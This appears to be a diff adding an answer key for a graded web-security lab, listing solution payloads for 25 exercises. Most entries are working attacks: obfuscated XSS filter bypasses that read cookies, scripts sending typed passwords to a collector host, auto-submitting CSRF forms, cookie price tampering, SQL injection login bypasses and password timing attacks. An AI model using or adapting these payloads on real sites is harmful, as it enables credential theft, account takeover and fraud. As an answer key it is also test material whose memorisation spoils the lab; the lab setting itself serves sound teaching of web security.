@@ -1,0 +1,120 @@
+1.	XSS - Type 1 - Hello world! (4 points) 
+<script>call_upon_injection();</script>
+
+2.	XSS - Type 1 - Filtering: The Return (4 points) 
+<script>document.getElementById('stolen_cookie').value=document.cookie;</script>
+
+
+3.	XSS - Type 1 - Filtering: The Last Stand (4 points) 
+<script>document.getElementById(String.fromCharCode(115, 116, 111, 108, 101, 110, 95, 99, 111, 111, 107, 105, 101)).value=document.cookie;</script>
+
+
+4.	XSS - Type 1 - Filtering: Another one bites the dust (4 points) 
+<script>eval(unescape(/%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%53%74%72%69%6E%67%2E%66%72%6F%6D%43%68%61%72%43%6F%64%65%28%31%31%35%2C%20%31%31%36%2C%20%31%31%31%2C%20%31%30%38%2C%20%31%30%31%2C%20%31%31%30%2C%20%39%35%2C%20%39%39%2C%20%31%31%31%2C%20%31%31%31%2C%20%31%30%37%2C%20%31%30%35%2C%20%31%30%31%29%29%2E%76%61%6C%75%65%3D%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3B/.source));</script> 
+
+5.	XSS - Type 1 - Filtering: Revolution (4 points)
+<img src="hey.gif" onerror=eval(unescape(/%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%53%74%72%69%6E%67%2E%66%72%6F%6D%43%68%61%72%43%6F%64%65%28%31%31%35%2C%20%31%31%36%2C%20%31%31%31%2C%20%31%30%38%2C%20%31%30%31%2C%20%31%31%30%2C%20%39%35%2C%20%39%39%2C%20%31%31%31%2C%20%31%31%31%2C%20%31%30%37%2C%20%31%30%35%2C%20%31%30%31%29%29%2E%76%61%6C%75%65%3D%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3B/.source))> 
+
+6.	XSS - Type 1 - Filtering: The End (4 points) 
+<img src=hey.gif onerror=&#101&#118&#97&#108&#40&#117&#110&#101&#115&#99&#97&#112&#101&#40&#47&#37&#54&#52&#37&#54&#70&#37&#54&#51&#37&#55&#53&#37&#54&#68&#37&#54&#53&#37&#54&#69&#37&#55&#52&#37&#50&#69&#37&#54&#55&#37&#54&#53&#37&#55&#52&#37&#52&#53&#37&#54&#67&#37&#54&#53&#37&#54&#68&#37&#54&#53&#37&#54&#69&#37&#55&#52&#37&#52&#50&#37&#55&#57&#37&#52&#57&#37&#54&#52&#37&#50&#56&#37&#53&#51&#37&#55&#52&#37&#55&#50&#37&#54&#57&#37&#54&#69&#37&#54&#55&#37&#50&#69&#37&#54&#54&#37&#55&#50&#37&#54&#70&#37&#54&#68&#37&#52&#51&#37&#54&#56&#37&#54&#49&#37&#55&#50&#37&#52&#51&#37&#54&#70&#37&#54&#52&#37&#54&#53&#37&#50&#56&#37&#51&#49&#37&#51&#49&#37&#51&#53&#37&#50&#67&#37&#50&#48&#37&#51&#49&#37&#51&#49&#37&#51&#54&#37&#50&#67&#37&#50&#48&#37&#51&#49&#37&#51&#49&#37&#51&#49&#37&#50&#67&#37&#50&#48&#37&#51&#49&#37&#51&#48&#37&#51&#56&#37&#50&#67&#37&#50&#48&#37&#51&#49&#37&#51&#48&#37&#51&#49&#37&#50&#67&#37&#50&#48&#37&#51&#49&#37&#51&#49&#37&#51&#48&#37&#50&#67&#37&#50&#48&#37&#51&#57&#37&#51&#53&#37&#50&#67&#37&#50&#48&#37&#51&#57&#37&#51&#57&#37&#50&#67&#37&#50&#48&#37&#51&#49&#37&#51&#49&#37&#51&#49&#37&#50&#67&#37&#50&#48&#37&#51&#49&#37&#51&#49&#37&#51&#49&#37&#50&#67&#37&#50&#48&#37&#51&#49&#37&#51&#48&#37&#51&#55&#37&#50&#67&#37&#50&#48&#37&#51&#49&#37&#51&#48&#37&#51&#53&#37&#50&#67&#37&#50&#48&#37&#51&#49&#37&#51&#48&#37&#51&#49&#37&#50&#57&#37&#50&#57&#37&#50&#69&#37&#55&#54&#37&#54&#49&#37&#54&#67&#37&#55&#53&#37&#54&#53&#37&#51&#68&#37&#54&#52&#37&#54&#70&#37&#54&#51&#37&#55&#53&#37&#54&#68&#37&#54&#53&#37&#54&#69&#37&#55&#52&#37&#50&#69&#37&#54&#51&#37&#54&#70&#37&#54&#70&#37&#54&#66&#37&#54&#57&#37&#54&#53&#37&#51&#66&#47&#46&#115&#111&#117&#114&#99&#101&#41&#41>
+
+7. XSS - Type 1 - XSS headers (4 points) 
+
+8. XSS - Type 2 - Hello world (4 points) 
+bob<script>call_upon_injection();</script>
+
+9. XSS - Type 2 - The iframe tag (4 points): Be careful with this exercise. Don’t use document.write() or any other function that writes to the page to help you debug your answer, or the input boxes may get overwritten and you may not be able to get them back. Hint: Use alert() in your trial and error process instead. 
+<iframe src=# onmouseover="call_upon_injection()"></iframe>
+
+10. XSS Payloads - Steal the password (Redirect) (4 points) 
+<script> document.forms["login"].action = "http://powned/exercises/xss/giveMeThePassword.php";</script>
+
+11. XSS Payloads - Steal the password (XHR) (4 points) 
+    <script>
+    document.forms["login"].onsubmit = function() {myFunction()};
+    function myFunction() {
+        var http = new XMLHttpRequest();
+        var url = "http://powned/exercises/xss/giveMeThePassword.php";
+        var params = "password="+document.forms["login"].password.value;
+        http.open("GET", url+"?"+params, false);
+        http.send(null);
+    }
+    </script>
+
+12. XSS Payloads - Camouflage (4 points) 
+<script>document.getElementById("subtitle").innerHTML="We are pathetic and you know that!";
+document.getElementById('tr2').style.display = "none";
+</script>
+
+13. CSRF - Zero-sum game (4 points) 
+http://webseclab-vm/exercises/csrf/csrf_basic.php?to=3&from=1
+
+14. CSRF - My POST email (4 points) 
+    <form id="myForm" action="http://webseclab-vm/exercises/csrf/csrf_email_post.php" method="POST">
+    <input type="hidden" name="newEmail" value="pwn5@pwnd.com"/>
+    <input type="hidden" name="uid" value="1"/>
+    </form>
+    <script>
+    document.getElementById("myForm").submit();
+    window.location.replace("http://www.stanford.edu");
+    </script>
+
+15. CSRF - Has my time come? (4 points) 
+<script>
+    var d = new Date();
+    var token = String(d.getTime()).slice(0,10);
+    document.write(token);
+
+    var html = '<form id="myForm" action="http://webseclab-vm/exercises/csrf/csrf_token.php" method="GET"><input type="hidden" name="token" value=' + token + '/><input type="hidden" name="from" value="1"/><input type="hidden" name="to" value="4"/><input value="Free money!" type="submit"></form>';
+document.write(html);
+    </script>
+
+16. CSRF - HTTP parameter pollution (4 points) 
+Bob&from=Alice
+
+17. Session - Protect the shop (4 points)
+setcookie("domain", FALSE, time()+3600);
+
+18. Session - Buy it cheaper #2 (4 points) 
+document.cookie="price=299;";
+
+19. Session - Buy it cheaper #3 (4 points) 
+document.cookie="control=12558;";
+document.cookie="price=299;";
+
+20. Session - Buy it cheaper #5 (4 points) 
+document.cookie="control=28800;";
+document.cookie="price=200;";
+
+21. Session - Buy it cheaper #6 (4 points) 
+document.cookie="control=a3fffc30175fe42501677361b553ab2c3e03c0ec;";
+document.cookie="price=200;";
+
+22. SQL Injection - Basic bypass (4 points) 
+Username: Edric
+Password: a’ OR 1=1 #
+
+23. SQL Injection - Ultimate bypass (4 points) 
+Username: Edric
+Password a' UNION SELECT 'Edric' #
+
+24. Mixing Content- Timing attack #1 (4 points) 
+for(var pass in passwords){
+  var start = new Date();
+  var myRequest = new XMLHttpRequest();
+  myRequest.open("post", "http://otherSiteA/exercises/mixingContent/authLvl1.php", false);
+  myRequest.send("pass="+passwords[pass]);
+  var finish = new Date();
+  var diff = (finish.getTime() - start.getTime());
+  alert(finish.getTime()+ " " +start.getTime());
+  if(diff > 1000){
+    alert( passwords[pass] );
+  }
+}
+
+25. Mixing Content- Timing attack #2 (4 points)
+window.onload=window.start = (new Date()).getTime();
+for(var i = 0; i <31; i++){   
+   document.write("<img src=\"http://otherSiteA/exercises/mixingContent/authLvl2.php?name="+document.getElementById("name"+i).innerHTML+"&pass=pass&no=no&exoId=\" id=\"useMe\" onerror=\"alert('"+document.getElementById("name"+i).innerHTML+" '+((new Date()).getTime()-window.start))\">\n");
+}
+
